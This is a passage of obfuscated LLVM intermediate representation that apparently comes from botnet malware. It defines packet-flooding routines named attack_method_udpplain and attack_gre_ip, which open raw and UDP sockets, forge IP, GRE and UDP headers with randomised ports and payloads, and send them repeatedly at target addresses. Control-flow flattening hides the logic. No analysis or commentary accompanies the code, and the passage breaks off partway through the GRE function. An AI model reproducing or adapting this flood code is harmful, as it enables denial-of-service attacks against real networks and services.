  %237 = load i16, i16* %17, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  %240 = select i1 %239, i32 533816917, i32 -99470555
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32 @rand_next()
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  store i32 -99470555, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = bitcast %struct.iphdr* %249 to i16*
  %251 = call zeroext i16 @checksum_generic(i16* %250, i32 20)
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 3
  store i16 0, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = bitcast %struct.udphdr* %257 to i8*
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  %261 = load i16, i16* %260, align 2
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 12, %263
  %265 = trunc i64 %264 to i32
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %261, i32 %265)
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  %271 = load i16, i16* %270, align 2
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 0
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %276, i32 0, i32 1
  store i16 %271, i16* %277, align 2
  %278 = load i32, i32* %10, align 4
  %279 = load i8*, i8** %23, align 8
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = bitcast %struct.sockaddr_in* %288 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %283, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %278, i8* %279, i64 %282, i32 16384, %struct.sockaddr* %291, i32 16)
  store i32 -823807508, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  store i32 -1170090276, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 -1191299760, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %296, %293, %246, %241, %236, %231, %226, %221, %216, %195, %175, %169, %168, %167, %164, %128, %124, %76, %70, %69, %66, %60, %59, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -26428999, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -26428999, label %first
    i32 -52519765, label %52
    i32 1716528632, label %55
    i32 712420047, label %58
    i32 -486848436, label %59
    i32 -1828426, label %65
    i32 1977585271, label %75
    i32 -1477931851, label %84
    i32 -43889691, label %93
    i32 1251555864, label %101
    i32 -202020598, label %102
    i32 507750365, label %120
    i32 222635164, label %121
    i32 -623960040, label %131
    i32 -1568607238, label %157
    i32 1984673446, label %175
    i32 744399794, label %176
    i32 -961457977, label %177
    i32 1947133707, label %180
    i32 978835807, label %181
    i32 1062575599, label %182
    i32 -245476138, label %188
    i32 132643350, label %197
    i32 1648104800, label %201
    i32 345412216, label %211
    i32 -1604905839, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -52519765, i32 1716528632
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 712420047, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #8
  store i16 %57, i16* %13, align 2
  store i32 712420047, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -486848436, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 -1828426, i32 1947133707
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 1977585271, i32 -1477931851
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -43889691, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #8
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -43889691, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 1251555864, i32 -202020598
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #7
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 507750365, i32 222635164
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 222635164, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -623960040, i32 -1568607238
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #8
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #8
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -1568607238, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 1984673446, i32 744399794
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 744399794, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -961457977, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -486848436, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 978835807, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1062575599, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 -245476138, i32 -1604905839
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 132643350, i32 1648104800
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 1648104800, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 345412216, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 1062575599, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 978835807, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #7
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %76, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1171134360, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1171134360, label %first
    i32 -146017482, label %79
    i32 565807897, label %80
    i32 625442846, label %86
    i32 -1717790705, label %89
    i32 1480811124, label %90
    i32 -1713764877, label %96
    i32 -1980075099, label %147
    i32 -1206848359, label %151
    i32 -1167544979, label %201
    i32 -1692994041, label %205
    i32 315928222, label %214
    i32 -761289566, label %220
    i32 -1791671282, label %228
    i32 -1288188576, label %244
    i32 1466012936, label %247
    i32 -1010018415, label %248
    i32 -1176642394, label %249
    i32 2060200437, label %255
    i32 1415839121, label %284
    i32 685216577, label %305
    i32 -230753772, label %309
    i32 136797279, label %313
    i32 -1166771661, label %318
    i32 -1281949915, label %333
    i32 997216507, label %338
    i32 593896366, label %344
    i32 1489881105, label %349
    i32 -1685223351, label %355
    i32 748355363, label %359
    i32 -391715533, label %363
    i32 1766322057, label %369
    i32 1056461387, label %373
    i32 -1191571831, label %376
    i32 1569351573, label %443
    i32 58946797, label %446
    i32 392155836, label %447
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %77 = icmp eq i32 %.reload, -1
  %78 = select i1 %77, i32 -146017482, i32 565807897
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 392155836, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %10, align 4
  %82 = bitcast i32* %9 to i8*
  %83 = call i32 @setsockopt(i32 %81, i32 0, i32 3, i8* %82, i32 4) #7
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 625442846, i32 -1717790705
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  store i32 392155836, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1480811124, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = select i1 %94, i32 -1713764877, i32 1466012936
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call noalias i8* @calloc(i64 1510, i64 8) #7
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  store i8* %97, i8** %101, align 8
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = bitcast i8* %106 to %struct.iphdr*
  store %struct.iphdr* %107, %struct.iphdr** %22, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i64 1
  %110 = bitcast %struct.iphdr* %109 to %struct.grehdr*
  store %struct.grehdr* %110, %struct.grehdr** %23, align 8
  %111 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %112 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %111, i64 1
  %113 = bitcast %struct.grehdr* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %12, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i32, i32* %18, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 52, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #8
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %13, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #8
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %15, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 -1980075099, i32 -1206848359
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
